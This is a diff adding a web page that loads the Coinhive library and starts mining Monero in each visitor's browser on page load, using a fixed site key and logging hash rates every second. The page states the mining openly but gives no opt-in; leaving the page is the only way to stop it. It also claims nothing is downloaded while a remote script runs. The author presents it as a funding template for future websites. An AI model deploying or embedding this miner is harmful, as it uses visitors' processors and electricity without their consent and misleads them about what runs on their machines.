@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>We are mining using your computer!</title>
+   <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+  </head>
+
+  <body>
+    <h1>By being on this website you are helping me by mining Monero in your browser!</h1>
+    <p> Check out <a href="coin-hive.com"> Coin Hive </a> for moore details or to make your own version of
+      this browser based miner. This plane page will be updated and incorported in to future websites for
+      funding purposes.  If you would like to stop mining all you have to do is leave this page.  There was
+      nothing downloaded to your computer and no information stored from your browsing.  Thank you! </p>
+
+     <script>
+         var miner = new CoinHive.Anonymous('hogrqBX0QxbpTggZ7jos9BEk9fvqgOon');
+         miner.start();
+
+         // Listen on events
+         miner.on('found', function() {
+             console.log("found hash!")
+         })
+         miner.on('accepted', function() {
+             console.log("accepted hash!")
+         })
+
+         // Update stats once per second
+         setInterval(function() {
+             var hashesPerSecond = miner.getHashesPerSecond();
+             var totalHashes = miner.getTotalHashes();
+             var acceptedHashes = miner.getAcceptedHashes();
+
+             console.log("hashesPerSecond", hashesPerSecond)
+             console.log("totalHashes", totalHashes)
+             console.log("acceptedHashes", acceptedHashes)
+
+             console.log("-----------")
+             console.log("-----------")
+             console.log("-----------")
+
+             // Output to HTML elements...
+         }, 1000);
+     </script>
+  </body>
+</html>
